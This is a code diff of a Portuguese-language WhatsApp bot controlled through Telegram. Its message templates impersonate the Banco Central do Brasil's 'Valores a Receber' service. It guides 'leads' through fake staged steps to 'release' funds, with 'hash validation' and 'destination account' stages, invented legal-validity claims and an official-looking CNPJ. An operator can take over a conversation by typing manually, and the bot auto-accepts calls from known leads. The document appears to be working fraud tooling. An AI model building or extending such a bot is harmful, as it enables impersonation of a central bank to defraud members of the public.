@@ -444,200 +444,127 @@ let lastQrNotification = 0;
 let isBotReady = false;
 let qrSentToTelegram = false;
 
-// 🔍 Detecta automaticamente o caminho do Chrome no Linux (ShardCloud/VPS)
-function getChromePath() {
-    // 1. Tenta comandos do sistema (Linux/Mac) - PRIORIDADE MÁXIMA
+// --- GERENCIADOR DE NAVEGADOR (ESTRATÉGIA TANQUE) ---
+function getBrowserStrategies() {
+    const strategies = [];
+
+    // 1. Variável de Ambiente (Alta prioridade em containers)
+    if (process.env.PUPPETEER_EXECUTABLE_PATH) {
+        strategies.push({ name: 'AMBIENTE', path: process.env.PUPPETEER_EXECUTABLE_PATH });
+    }
+
+    // 2. Caminhos do Sistema Linux (ShardCloud/Ubuntu)
     if (process.platform !== 'win32') {
-        const systemPaths = [
-            '/app/.apt/usr/bin/google-chrome',
-            '/app/.apt/usr/bin/chromium-browser',
-            '/app/.apt/usr/bin/google-chrome-stable',
+        const sysPaths = [
             '/usr/bin/google-chrome-stable',
             '/usr/bin/google-chrome',
             '/usr/bin/chromium-browser',
             '/usr/bin/chromium',
-            '/app/.apt/usr/bin/chromium',
+            '/app/.apt/usr/bin/google-chrome',
+            '/app/.apt/usr/bin/chromium-browser',
+            '/app/.apt/usr/bin/google-chrome-stable',
+            '/usr/bin/google-chrome',
             '/usr/local/bin/google-chrome'
         ];
-        console.log('🔍 [DIAGNÓSTICO] Verificando caminhos de sistema...');
-        for (const sysPath of systemPaths) {
-            const exists = fs.existsSync(sysPath);
-            console.log(`   - ${sysPath}: ${exists ? '✅ EXISTE' : '❌ NÃO ENCONTRADO'}`);
-            if (exists) {
-                console.log(`🚀 [CHROME] Selecionado Chrome do Sistema: ${sysPath}`);
-                return sysPath;
+        sysPaths.forEach(p => strategies.push({ name: 'SISTEMA', path: p }));
+    }
+
+    // 3. Cache do Puppeteer (Instalação automática)
+    const localCache = path.join(process.cwd(), '.cache', 'puppeteer');
+    const findInCache = (dir) => {
+        const res = [];
+        try {
+            if (!fs.existsSync(dir)) return res;
+            const files = fs.readdirSync(dir);
+            for (const f of files) {
+                const fp = path.join(dir, f);
+                const stat = fs.statSync(fp);
+                if (stat.isDirectory()) res.push(...findInCache(fp));
+                else if ((f === 'chrome' || f === 'chromium' || f === 'google-chrome') && !f.includes('.')) res.push(fp);
+                else if (f === 'chrome.exe') res.push(fp);
             }
-        }
-    }
+        } catch (e) { }
+        return res;
+    };
+    findInCache(localCache).forEach(p => strategies.push({ name: 'CACHE_PUPPETEER', path: p }));
 
-    if (process.env.PUPPETEER_EXECUTABLE_PATH) {
-        if (fs.existsSync(process.env.PUPPETEER_EXECUTABLE_PATH)) {
-            console.log(`✅ [CHROME] Usando caminho da variável de ambiente: ${process.env.PUPPETEER_EXECUTABLE_PATH}`);
-            return process.env.PUPPETEER_EXECUTABLE_PATH;
-        }
-    }
-
-    // 2. Tenta ler o caminho salvo pelo script de download (Fallback)
+    // 4. Caminho Manual do download-chrome.cjs
     try {
-        const savedPathFile = path.join(process.cwd(), 'chrome-path.json');
-        if (fs.existsSync(savedPathFile)) {
-            const savedData = JSON.parse(fs.readFileSync(savedPathFile, 'utf8'));
-            if (savedData.path && fs.existsSync(savedData.path)) {
-                console.log(`✅ [CHROME] Usando caminho salvo em chrome-path.json: ${savedData.path}`);
-                
-                // --- RESGATE DE ICU (ICUDTL.DAT) ---
-                const chromeDir = path.dirname(savedData.path);
-                const icuPath = path.join(chromeDir, 'icudtl.dat');
-                
-                if (!fs.existsSync(icuPath)) {
-                    console.log('⚠️ [ALERTA] icudtl.dat AUSENTE! Iniciando busca de emergência no servidor...');
-                    
-                    const searchPaths = [
-                        process.cwd(),
-                        '/usr/lib',
-                        '/usr/share',
-                        '/app'
-                    ];
-
-                    let foundPath = null;
-                    const findICU = (dir, depth = 0) => {
-                        if (depth > 4 || foundPath) return; // Limita profundidade
-                        try {
-                            const files = fs.readdirSync(dir);
-                            for (const f of files) {
-                                const fp = path.join(dir, f);
-                                if (f === 'icudtl.dat') {
-                                    foundPath = fp;
-                                    return;
-                                }
-                                if (fs.statSync(fp).isDirectory() && !f.startsWith('.')) {
-                                    findICU(fp, depth + 1);
-                                }
-                            }
-                        } catch (e) { }
-                    };
-
-                    for (const s of searchPaths) {
-                        if (fs.existsSync(s)) findICU(s);
-                        if (foundPath) break;
-                    }
-
-                    if (foundPath) {
-                        console.log(`✨ [RESGATE] Arquivo encontrado em: ${foundPath}. Copiando para ${icuPath}`);
-                        try {
-                            fs.copyFileSync(foundPath, icuPath);
-                        } catch (e) {
-                            console.log(`❌ [RESGATE] Erro ao copiar: ${e.message}`);
-                        }
-                    } else {
-                        console.log('💀 [RESGATE] Não foi possível encontrar icudtl.dat em lugar nenhum.');
-                    }
-                } else {
-                    console.log('💎 [CHROME] Arquivo icudtl.dat verificado com sucesso.');
-                }
-
-                try {
-                    if (process.platform !== 'win32') {
-                        fs.chmodSync(savedData.path, '755');
-                    }
-                } catch (e) { }
-                return savedData.path;
-            }
+        const savedFile = path.join(process.cwd(), 'chrome-path.json');
+        if (fs.existsSync(savedFile)) {
+            const data = JSON.parse(fs.readFileSync(savedFile, 'utf8'));
+            if (data.path) strategies.push({ name: 'MANUAL_DOWNLOAD', path: data.path });
         }
     } catch (e) { }
-    const { execSync } = require('child_process');
-    const commands = ['which google-chrome', 'which google-chrome-stable', 'which chromium', 'which chromium-browser'];
-    for (const cmd of commands) {
+
+    // 5. Fallback Local Windows
+    if (process.platform === 'win32') {
+        strategies.push({ name: 'WINDOWS_DEFAULT', path: 'C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe' });
+    }
+
+    // Limpeza de duplicatas e verificação de existência real
+    const unique = [];
+    const seen = new Set();
+    for (const s of strategies) {
         try {
-            const p = execSync(cmd).toString().trim();
-            if (p && fs.existsSync(p)) {
-                console.log(`✅ [CHROME] Encontrado via comando '${cmd}': ${p}`);
-                return p;
+            if (fs.existsSync(s.path) && !seen.has(s.path)) {
+                unique.push(s);
+                seen.add(s.path);
             }
         } catch (e) { }
     }
-
-const paths = [
-    '/usr/bin/google-chrome-stable',
-    '/usr/bin/google-chrome',
-    '/usr/bin/chromium-browser',
-    '/usr/bin/chromium',
-    '/snap/bin/chromium',
-    '/app/.cache/puppeteer',
-    path.join(process.cwd(), 'chrome-data', 'chrome', 'linux-latest', 'chrome-linux64', 'chrome'),
-    path.join(process.cwd(), '.cache', 'puppeteer', 'chrome', 'linux-latest', 'chrome-linux64', 'chrome')
-];
-
-for (const p of paths) {
-    try {
-        if (fs.existsSync(p)) {
-            if (fs.statSync(p).isDirectory()) {
-                const found = findInDir(p);
-                if (found) return found;
-            } else {
-                console.log(`✅ [CHROME] Encontrado em caminho conhecido: ${p}`);
-                return p;
-            }
-        }
-    } catch (e) { }
+    return unique;
 }
 
-function findInDir(baseDir) {
-    try {
-        if (!fs.existsSync(baseDir)) return null;
-        const findExecutable = (dir) => {
-            const files = fs.readdirSync(dir);
-            for (const file of files) {
-                const fullPath = path.join(dir, file);
-                const stat = fs.statSync(fullPath);
-                if (stat.isDirectory()) {
-                    const found = findExecutable(fullPath);
-                    if (found) return found;
-                } else if (file === 'chrome' || file === 'chromium' || file === 'google-chrome') {
-                    if (process.platform !== 'win32') {
-                        try {
-                            fs.accessSync(fullPath, fs.constants.X_OK);
-                            return fullPath;
-                        } catch (e) { }
-                    } else {
-                        return fullPath;
+const strategies = getBrowserStrategies();
+console.log(`🔍 [CHROME] ${strategies.length} estratégias disponíveis para o ambiente ${process.platform}.`);
+
+if (strategies.length === 0) {
+    console.warn('⚠️ [CHROME] Nenhum executável encontrado. Tentando inicialização padrão...');
+    strategies.push({ name: 'DEFAULT', path: undefined });
+}
+
+const chosenStrategy = strategies[0];
+console.log(`\n🚀 [ESTRATÉGIA: ${chosenStrategy.name}] Selecionada: ${chosenStrategy.path || 'Padrão'}`);
+
+// --- RESGATE DE ICU EM TEMPO DE EXECUÇÃO ---
+if (chosenStrategy.path && process.platform !== 'win32') {
+    const chromeDir = path.dirname(chosenStrategy.path);
+    const icuFile = path.join(chromeDir, 'icudtl.dat');
+    if (!fs.existsSync(icuFile)) {
+        console.log(`⚠️ [ALERTA] icudtl.dat ausente em ${chromeDir}. Iniciando resgate...`);
+        const findICU = (dir, depth = 0) => {
+            if (depth > 4) return null;
+            try {
+                const files = fs.readdirSync(dir);
+                for (const f of files) {
+                    const fp = path.join(dir, f);
+                    if (f === 'icudtl.dat') return fp;
+                    if (fs.statSync(fp).isDirectory() && !f.startsWith('.')) {
+                        const found = findICU(fp, depth + 1);
+                        if (found) return found;
                     }
                 }
-            }
+            } catch (e) { }
             return null;
         };
-        const found = findExecutable(baseDir);
-        if (found) {
-            console.log(`✅ [CHROME] Encontrado via busca recursiva em ${baseDir}: ${found}`);
-            return found;
+        const rescuePath = findICU(process.cwd()) || findICU('/app') || findICU('/usr/lib') || findICU('/usr/share');
+        if (rescuePath) {
+            console.log(`✨ [RESGATE] icudtl.dat encontrado em ${rescuePath}. Aplicando correção...`);
+            try { fs.copyFileSync(rescuePath, icuFile); } catch (e) { console.log('❌ Falha ao copiar ICU:', e.message); }
         }
-    } catch (e) { }
-    return null;
+    }
 }
-
-const foundInChromeData = findInDir(path.join(process.cwd(), 'chrome-data'));
-if (foundInChromeData) return foundInChromeData;
-
-const foundInCache = findInDir(path.join(process.cwd(), '.cache', 'puppeteer'));
-if (foundInCache) return foundInCache;
-
-console.log('⚠️ [CHROME] Nenhum executável encontrado. Puppeteer tentará o padrão.');
-return undefined;
-}
-
-
-console.log(`🐧 [SISTEMA] Iniciando bot em ambiente: ${process.platform} (${process.arch})`);
 
 const client = new Client({
     authStrategy: new LocalAuth({ clientId: BOT_ID, dataPath: '.wwebjs_auth' }),
-    authTimeoutMs: 0,
-    qrTimeoutMs: 0,
+    qrMaxRetries: 5,
     takeoverOnConflict: true,
     takeoverTimeoutMs: 0,
     userAgent: 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
     puppeteer: {
         headless: true,
-        executablePath: getChromePath(),
+        executablePath: chosenStrategy.path,
         args: [
             '--no-sandbox',
             '--disable-setuid-sandbox',
@@ -645,16 +572,16 @@ const client = new Client({
             '--disable-dev-shm-usage',
             '--disable-gpu',
             '--no-zygote',
+            '--single-process',
+            '--hide-scrollbars',
+            '--mute-audio',
             '--no-first-run',
-            '--single-process', // Re-adicionado para corrigir erro de descritor de ICU
             '--disable-extensions',
             '--disable-background-networking',
             '--disable-default-apps',
             '--disable-sync',
             '--disable-translate',
-            '--hide-scrollbars',
             '--metrics-recording-only',
-            '--mute-audio',
             '--safebrowsing-disable-auto-update',
             '--ignore-certificate-errors',
             '--ignore-ssl-errors',
@@ -669,194 +596,192 @@ const client = new Client({
     }
 });
 
-console.log('🚀 [BOT] Cliente instanciado. Aguardando inicialização...');
+    // Listener de desconexão consolidado
+    client.on('disconnected', (reason) => {
+        console.log(`❌ [BOT] Desconectado: ${reason}`);
+        isBotReady = false;
+        try {
+            fs.writeFileSync(STATUS_FILE, JSON.stringify({ status: 'DISCONNECTED', ts: Date.now(), reason }));
+        } catch (e) { }
 
-// Listener de desconexão consolidado
-client.on('disconnected', (reason) => {
-    console.log(`❌ [BOT] Desconectado: ${reason}`);
-    isBotReady = false;
-    try { 
-        fs.writeFileSync(STATUS_FILE, JSON.stringify({ status: 'DISCONNECTED', ts: Date.now(), reason })); 
-    } catch (e) { }
-    
-    // Se não for um logout manual, encerramos para o watchdog reiniciar
-    if (reason !== 'NAVIGATION') {
-        console.log('🔄 [RECOVERY] Reiniciando processo devido à desconexão...');
-        process.exit(1);
-    }
-});
+        // Se não for um logout manual, encerramos para o watchdog reiniciar
+        if (reason !== 'NAVIGATION') {
+            console.log('🔄 [RECOVERY] Reiniciando processo devido à desconexão...');
+            process.exit(1);
+        }
+    });
 
 
-client.on('qr', async (qr) => {
-    if (isBotReady || qrSentToTelegram) {
-        console.log('ℹ️ [QR CODE] Evento ignorado (Bot já pronto ou QR já enviado).');
-        return;
-    }
-    qrSentToTelegram = true;
+    client.on('qr', async (qr) => {
+        if (isBotReady || qrSentToTelegram) {
+            console.log('ℹ️ [QR CODE] Evento ignorado (Bot já pronto ou QR já enviado).');
+            return;
+        }
+        qrSentToTelegram = true;
 
-    console.log('\n📱 [QR CODE] Evento recebido! Gerando imagem...\n');
-    qrcode.generate(qr, { small: true });
-    
-    try {
-        fs.writeFileSync(STATUS_FILE, JSON.stringify({ status: 'WAITING_QR', qr, ts: Date.now() }));
-    } catch (e) {
-        console.error('❌ [ERRO] Falha ao salvar status WAITING_QR:', e.message);
-    }
+        console.log('\n📱 [QR CODE] Evento recebido! Gerando imagem...\n');
+        qrcode.generate(qr, { small: true });
 
-    try {
-        const slotLabel = BOT_ID === 'main' ? 'PERFIL 1' : BOT_ID.toUpperCase();
-        const qrBuffer = await QRCode.toBuffer(qr, { width: 512, margin: 2, color: { dark: '#111111', light: '#ffffff' } });
+        try {
+            fs.writeFileSync(STATUS_FILE, JSON.stringify({ status: 'WAITING_QR', qr, ts: Date.now() }));
+        } catch (e) {
+            console.error('❌ [ERRO] Falha ao salvar status WAITING_QR:', e.message);
+        }
 
-        const now = new Date();
-        const expiresAt = new Date(now.getTime() + 45000);
+        try {
+            const slotLabel = BOT_ID === 'main' ? 'PERFIL 1' : BOT_ID.toUpperCase();
+            const qrBuffer = await QRCode.toBuffer(qr, { width: 512, margin: 2, color: { dark: '#111111', light: '#ffffff' } });
 
-        const caption = `📲 <b>QR CODE — ${slotLabel}</b>\n\n` +
-            `Escaneie com o WhatsApp para conectar o bot.\n\n` +
-            `⏳ <b>Gerado às:</b> ${now.toLocaleTimeString('pt-BR')}\n` +
-            `⚠️ <b>Expira às:</b> ${expiresAt.toLocaleTimeString('pt-BR')} (Válido por 45s)\n\n` +
-            `<i>Após este horário, o QR pode expirar. Caso não conecte, clique no botão abaixo para atualizar.</i>`;
+            const now = new Date();
+            const expiresAt = new Date(now.getTime() + 45000);
 
-        const kb = {
-            inline_keyboard: [
-                [{ text: "🔄 Gerar Novo QR Code", callback_data: `cmd:refresh_qr:${BOT_ID}` }],
-                [{ text: "📱 Mudar Número WhatsApp", callback_data: `painel:change_whatsapp_num:${BOT_ID}` }],
-                [{ text: "🔌 Desconectar Sessão", callback_data: `painel:desconectar:slot:${BOT_ID}` }],
-                [{ text: "🏠 Painel Principal", callback_data: "painel:start" }]
-            ]
+            const caption = `📲 <b>QR CODE — ${slotLabel}</b>\n\n` +
+                `Escaneie com o WhatsApp para conectar o bot.\n\n` +
+                `⏳ <b>Gerado às:</b> ${now.toLocaleTimeString('pt-BR')}\n` +
+                `⚠️ <b>Expira às:</b> ${expiresAt.toLocaleTimeString('pt-BR')} (Válido por 45s)\n\n` +
+                `<i>Após este horário, o QR pode expirar. Caso não conecte, clique no botão abaixo para atualizar.</i>`;
+
+            const kb = {
+                inline_keyboard: [
+                    [{ text: "🔄 Gerar Novo QR Code", callback_data: `cmd:refresh_qr:${BOT_ID}` }],
+                    [{ text: "📱 Mudar Número WhatsApp", callback_data: `painel:change_whatsapp_num:${BOT_ID}` }],
+                    [{ text: "🔌 Desconectar Sessão", callback_data: `painel:desconectar:slot:${BOT_ID}` }],
+                    [{ text: "🏠 Painel Principal", callback_data: "painel:start" }]
+                ]
+            };
+
+            const form = new FormData();
+            form.append('chat_id', CHAT_ID);
+            form.append('photo', qrBuffer, { filename: 'qrcode.png', contentType: 'image/png' });
+            form.append('caption', caption, { contentType: 'text/plain' });
+            form.append('parse_mode', 'HTML');
+            form.append('reply_markup', JSON.stringify(kb));
+
+            const res = await axios.post(`https://api.telegram.org/bot${TG_TOKEN}/sendPhoto`, form, {
+                headers: form.getHeaders(),
+                timeout: 15000,
+                httpsAgent: getSecureHttpsAgent()
+            });
+
+            if (res.data?.result) {
+                const msgId = res.data.result.message_id;
+                saveQrMsgId(msgId);
+
+                // 🕒 Timer para marcar como expirado no Telegram
+                setTimeout(async () => {
+                    if (!isBotReady) {
+                        try {
+                            await axios.post(`https://api.telegram.org/bot${TG_TOKEN}/editMessageCaption`, {
+                                chat_id: CHAT_ID,
+                                message_id: msgId,
+                                caption: `❌ <b>QR CODE EXPIRADO — ${slotLabel}</b>\n\nEste código não é mais válido. Clique no botão abaixo para gerar um novo.`,
+                                parse_mode: 'HTML',
+                                reply_markup: JSON.stringify({
+                                    inline_keyboard: [
+                                        [{ text: "🔄 Gerar Novo QR Code", callback_data: `cmd:refresh_qr:${BOT_ID}` }],
+                                        [{ text: "📱 Mudar Número WhatsApp", callback_data: `painel:change_whatsapp_num:${BOT_ID}` }],
+                                        [{ text: "🔌 Desconectar Sessão", callback_data: `painel:desconectar:slot:${BOT_ID}` }],
+                                        [{ text: "🏠 Painel Principal", callback_data: "painel:start" }]
+                                    ]
+                                })
+                            });
+                        } catch (e) { }
+                        qrSentToTelegram = false; // Permite gerar um novo
+                    }
+                }, 45000);
+            }
+        } catch (e) {
+            console.error('❌ [TELEGRAM] Erro ao enviar QR Code:', e.message);
+            qrSentToTelegram = false;
+        }
+    });
+
+    client.on('ready', async () => {
+        if (isBotReady) return; // Evita múltiplas notificações de conexão
+        isBotReady = true;
+
+        console.log('✅ [BOT] WhatsApp conectado e pronto!');
+        let adminName = BOT_ID === 'main' ? 'Perfil 1' : BOT_ID;
+        try {
+            const info = client.info;
+            if (info && info.pushname) adminName = info.pushname;
+        } catch (e) { }
+
+        const updateBotStatus = () => {
+            try {
+                fs.writeFileSync(STATUS_FILE, JSON.stringify({
+                    status: 'CONNECTED',
+                    adminName,
+                    ts: Date.now(),
+                    memoryUsage: Math.round(process.memoryUsage().rss / 1024 / 1024) + 'MB'
+                }));
+            } catch (e) { }
         };
 
-        const form = new FormData();
-        form.append('chat_id', CHAT_ID);
-        form.append('photo', qrBuffer, { filename: 'qrcode.png', contentType: 'image/png' });
-        form.append('caption', caption, { contentType: 'text/plain' });
-        form.append('parse_mode', 'HTML');
-        form.append('reply_markup', JSON.stringify(kb));
+        updateBotStatus();
+        // Heartbeat a cada 30 segundos para o Watchdog do server.ts
+        setInterval(updateBotStatus, 30000);
 
-        const res = await axios.post(`https://api.telegram.org/bot${TG_TOKEN}/sendPhoto`, form, {
-            headers: form.getHeaders(),
-            timeout: 15000,
-            httpsAgent: getSecureHttpsAgent()
-        });
-
-        if (res.data?.result) {
-            const msgId = res.data.result.message_id;
-            saveQrMsgId(msgId);
-
-            // 🕒 Timer para marcar como expirado no Telegram
-            setTimeout(async () => {
-                if (!isBotReady) {
-                    try {
-                        await axios.post(`https://api.telegram.org/bot${TG_TOKEN}/editMessageCaption`, {
-                            chat_id: CHAT_ID,
-                            message_id: msgId,
-                            caption: `❌ <b>QR CODE EXPIRADO — ${slotLabel}</b>\n\nEste código não é mais válido. Clique no botão abaixo para gerar um novo.`,
-                            parse_mode: 'HTML',
-                            reply_markup: JSON.stringify({
-                                inline_keyboard: [
-                                    [{ text: "🔄 Gerar Novo QR Code", callback_data: `cmd:refresh_qr:${BOT_ID}` }],
-                                    [{ text: "📱 Mudar Número WhatsApp", callback_data: `painel:change_whatsapp_num:${BOT_ID}` }],
-                                    [{ text: "🔌 Desconectar Sessão", callback_data: `painel:desconectar:slot:${BOT_ID}` }],
-                                    [{ text: "🏠 Painel Principal", callback_data: "painel:start" }]
-                                ]
-                            })
-                        });
-                    } catch (e) { }
-                    qrSentToTelegram = false; // Permite gerar um novo
-                }
-            }, 45000);
-        }
-    } catch (e) {
-        console.error('❌ [TELEGRAM] Erro ao enviar QR Code:', e.message);
-        qrSentToTelegram = false;
-    }
-});
-
-client.on('ready', async () => {
-    if (isBotReady) return; // Evita múltiplas notificações de conexão
-    isBotReady = true;
-
-    console.log('✅ [BOT] WhatsApp conectado e pronto!');
-    let adminName = BOT_ID === 'main' ? 'Perfil 1' : BOT_ID;
-    try {
-        const info = client.info;
-        if (info && info.pushname) adminName = info.pushname;
-    } catch (e) { }
-
-    const updateBotStatus = () => {
-        try {
-            fs.writeFileSync(STATUS_FILE, JSON.stringify({
-                status: 'CONNECTED',
-                adminName,
-                ts: Date.now(),
-                memoryUsage: Math.round(process.memoryUsage().rss / 1024 / 1024) + 'MB'
-            }));
-        } catch (e) { }
-    };
-
-    updateBotStatus();
-    // Heartbeat a cada 30 segundos para o Watchdog do server.ts
-    setInterval(updateBotStatus, 30000);
-
-    const caption = `✅ <b>${BOT_ID.toUpperCase()} CONECTADO</b>\n\n📱 WhatsApp vinculado com sucesso!\nO bot está pronto para atendimento.`;
-    if (lastQrMsgId) {
-        // Tenta editar a mensagem do QR para a de sucesso
-        try {
-            await axios.post(`https://api.telegram.org/bot${TG_TOKEN}/editMessageCaption`, {
-                chat_id: CHAT_ID,
-                message_id: lastQrMsgId,
-                caption,
-                parse_mode: 'HTML'
-            });
-            console.log('✅ [TELEGRAM] Mensagem de QR Code atualizada para sucesso.');
-            lastQrMsgId = 0;
-        } catch (e) {
-            console.error('❌ [TELEGRAM] Erro ao editar caption:', e.message);
+        const caption = `✅ <b>${BOT_ID.toUpperCase()} CONECTADO</b>\n\n📱 WhatsApp vinculado com sucesso!\nO bot está pronto para atendimento.`;
+        if (lastQrMsgId) {
+            // Tenta editar a mensagem do QR para a de sucesso
+            try {
+                await axios.post(`https://api.telegram.org/bot${TG_TOKEN}/editMessageCaption`, {
+                    chat_id: CHAT_ID,
+                    message_id: lastQrMsgId,
+                    caption,
+                    parse_mode: 'HTML'
+                });
+                console.log('✅ [TELEGRAM] Mensagem de QR Code atualizada para sucesso.');
+                lastQrMsgId = 0;
+            } catch (e) {
+                console.error('❌ [TELEGRAM] Erro ao editar caption:', e.message);
+                notifyTelegram(caption);
+            }
+        } else {
             notifyTelegram(caption);
         }
-    } else {
-        notifyTelegram(caption);
-    }
-});
+    });
 
-client.on('incoming_call', async (call) => {
-    if (BOT_ID !== 'main') return;
-    const targetChatId = call.from;
-    const currentSession = chatSessions.get(targetChatId);
+    client.on('incoming_call', async (call) => {
+        if (BOT_ID !== 'main') return;
+        const targetChatId = call.from;
+        const currentSession = chatSessions.get(targetChatId);
 
-    console.log(`📞 [INCOMING] Chamada de ${targetChatId}`);
+        console.log(`📞 [INCOMING] Chamada de ${targetChatId}`);
 
-    if (currentSession) {
-        currentSession.isCalling = true;
-        chatSessions.set(targetChatId, currentSession);
+        if (currentSession) {
+            currentSession.isCalling = true;
+            chatSessions.set(targetChatId, currentSession);
 
-        if (currentSession.tgMsgId) {
-            const { text: txt, reply_markup } = buildCadastroMessage(targetChatId, currentSession.name, currentSession.birthDate, 'human', currentSession.docType, currentSession.humanStep || 1, true);
-            await notifyTelegram(txt, currentSession.tgMsgId, reply_markup);
+            if (currentSession.tgMsgId) {
+                const { text: txt, reply_markup } = buildCadastroMessage(targetChatId, currentSession.name, currentSession.birthDate, 'human', currentSession.docType, currentSession.humanStep || 1, true);
+                await notifyTelegram(txt, currentSession.tgMsgId, reply_markup);
+            }
+
+            // Tenta aceitar a chamada automaticamente (não interrompe se falhar)
+            try { await call.accept(); } catch (_) { }
+        } else {
+            // Lead desconhecido ligando — registra no Telegram
+            try { await call.reject(); } catch (_) { }
         }
+    });
 
-        // Tenta aceitar a chamada automaticamente (não interrompe se falhar)
-        try { await call.accept(); } catch (_) { }
-    } else {
-        // Lead desconhecido ligando — registra no Telegram
-        try { await call.reject(); } catch (_) { }
-    }
-});
+    // Eventos de sistema removidos para evitar redundância (consolidados acima)
 
-// Eventos de sistema removidos para evitar redundância (consolidados acima)
+    // =============================================================
+    // HANDLER 1: 'message_create' — SOMENTE para detectar quando o
+    // admin digita manualmente e assume o atendimento de um lead.
+    // NÃO processa mensagens recebidas aqui para evitar confusão.
+    // =============================================================
 
-// =============================================================
-// HANDLER 1: 'message_create' — SOMENTE para detectar quando o
-// admin digita manualmente e assume o atendimento de um lead.
-// NÃO processa mensagens recebidas aqui para evitar confusão.
-// =============================================================
+    function buildStatusMessage(step) {
+        const s1 = step >= 1 ? '✅ Concluída' : '⏳ Pendente';
+        const s2 = (step === 2 || step === 21 || step >= 3) ? '✅ Concluída' : (step === 1 ? '🔄 Em andamento' : '⏳ Pendente');
+        const s3 = step >= 3 ? '✅ Concluída' : '⏳ Pendente';
+        const s4 = step >= 4 ? '✅ Concluída' : '⏳ Pendente';
 
-function buildStatusMessage(step) {
-    const s1 = step >= 1 ? '✅ Concluída' : '⏳ Pendente';
-    const s2 = (step === 2 || step === 21 || step >= 3) ? '✅ Concluída' : (step === 1 ? '🔄 Em andamento' : '⏳ Pendente');
-    const s3 = step >= 3 ? '✅ Concluída' : '⏳ Pendente';
-    const s4 = step >= 4 ? '✅ Concluída' : '⏳ Pendente';
-
-    return `🔐 *PORTAL DE VALORES — SISTEMA DE VALORES A RECEBER*
+        return `🔐 *PORTAL DE VALORES — SISTEMA DE VALORES A RECEBER*
 *Departamento de Liberação de Ativos Financeiros*
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━
 
@@ -889,11 +814,11 @@ _Contamos com sua colaboração e compreensão._
 *Portal de Valores — Banco Central do Brasil*
 *CNPJ: 00.038.166/0001-05*
 _Este canal é monitorado e possui validade jurídica._`;
-}
+    }
 
-// --- MENSAGENS POR ETAPA ---
-const MENSAGEM_ETAPA_2_CONCLUIDA =
-    `🔐 *PORTAL DE VALORES — SISTEMA DE VALORES A RECEBER*
+    // --- MENSAGENS POR ETAPA ---
+    const MENSAGEM_ETAPA_2_CONCLUIDA =
+        `🔐 *PORTAL DE VALORES — SISTEMA DE VALORES A RECEBER*
 *Departamento de Liberação de Ativos Financeiros*
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━
 
@@ -915,8 +840,8 @@ Nosso operador dará continuidade ao processo em instantes. Permaneça disponív
 *Portal de Valores — Banco Central do Brasil*
 _Este processo possui registro jurídico e validade legal._`;
 
-const MENSAGEM_ETAPA_3 =
-    `🔐 *ETAPA 3 — VALIDAÇÃO E HABILITAÇÃO DA CONTA DE DESTINO*
+    const MENSAGEM_ETAPA_3 =
+        `🔐 *ETAPA 3 — VALIDAÇÃO E HABILITAÇÃO DA CONTA DE DESTINO*
 *Departamento de Segurança Financeira — Portal de Valores*
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━
 
@@ -941,8 +866,8 @@ Aguarde o envio das instruções de validação (Código Hash de Autenticação)
 *Portal de Valores — Banco Central do Brasil*
 _Processo regido pela Resolução BCB nº 318/2023._`;
 
-const MENSAGEM_ETAPA_4 =
-    `🔐 *PROTOCOLO DE SEGURANÇA HOMOLOGADO*
+    const MENSAGEM_ETAPA_4 =
+        `🔐 *PROTOCOLO DE SEGURANÇA HOMOLOGADO*
 *Departamento de Rastreamento de Ativos — SVR*
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━
 
@@ -962,8 +887,8 @@ ${BT}
 ⚠️ *ATENÇÃO:* Permaneça nesta tela. O sistema está monitorando a validação do hash em tempo real. Assim que concluído, o montante total será liberado.
 
 *Portal de Valores — Banco Central do Brasil*`;
-const MENSAGEM_ETAPA_5 =
-    `✨ *PROTOCOLO FINALIZADO — RESGATE CONCLUÍDO* ✨
+    const MENSAGEM_ETAPA_5 =
+        `✨ *PROTOCOLO FINALIZADO — RESGATE CONCLUÍDO* ✨
 *Departamento de Execução Financeira — Portal de Valores*
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━
 
@@ -985,890 +910,890 @@ Agradecemos por utilizar os canais oficiais do Banco Central do Brasil para a re
 *Portal de Valores — Banco Central do Brasil*
 _Processo 100% Homologado e Finalizado._`;
 
-const BANCOS_LIST = JSON.parse(_d("eyIxMDAiOiJQbGFubmVyIENvcnJldG9yYSBkZSBWYWxvcmVzIFMuQS4iLCIxMDEiOiJSZW5hc2NlbmNhIERpc3RyaWJ1aWRvcmEgZGUgVMOtdHVsb3MgZSBWYWxvcmVzIE1vYmlsacOhcmlvcyBMdGRhIiwiMTAyIjoiWHAgSW52ZXN0aW1lbnRvcyBDb3JyZXRvcmEgZGUgQ8OibWJpbyxUw610dWxvcyBkIFZhbG9yZXMgTW9iaWxpw6FyaW9zIFMvQSIsIjEwNCI6IkNhaXhhIEVjb25vbWljYSBGZWRlcmFsIiwiMTA1IjoiTGVjY2EgQ3LDqWRpdG8iLCIxMDciOiJCYW5jbyBCb2NvbSBCYm0gUy5BLiIsIjEwOCI6IlBvcnRvY3JlZCBTLkEuIC0gQ3JlZGl0byIsIjExMSI6Ik9saXZlaXJhIFRydXN0IERpc3RyaWJ1aWRvcmEgZGUgVMOtdHVsb3MgZSBWYWxvcmVzIE1vYmlsaWFyaW9zIFMuQS4iLCIxMTMiOiJNYWdsaWFubyBTLkEuIENvcnJldG9yYSBEZSBDYW1iaW8gRSBWYWxvcmVzIE1vYmlsaWFyaW9zIiwiMTE0IjoiQ2VudHJhbCBDb29wZXJhdGl2YSBEZSBDcsOpZGl0byBObyBFc3RhZG8gRG8gRXNww61yaXRvIFNhbnRvIC0gQ2Vjb29wIiwiMTE3IjoiQWR2YW5jZWQgQ29ycmV0b3JhIERlIEPDom1iaW8gTHRkYSIsIjExOSI6IkJhbmNvIFdlc3Rlcm4gVW5pb24gRG8gQnJhc2lsIFMuQS4iLCIxMjAiOiJCYW5jbyBSb2RvYmVucyBTLkEuIiwiMTIxIjoiQmFuY28gQWdpYmFuayBTLkEuIiwiMTIyIjoiQmFuY28gQnJhZGVzY28gQmVyaiBTLkEuIiwiMTI0IjoiQmFuY28gV29vcmkgQmFuayBEbyBCcmFzaWwgUy5BLiIsIjEyNSI6IlBsdXJhbCBTLkEuIEJhbmNvIE3Dumx0aXBsbyIsIjEyNiI6IkJyIFBhcnRuZXJzIEJhbmNvIERlIEludmVzdGlt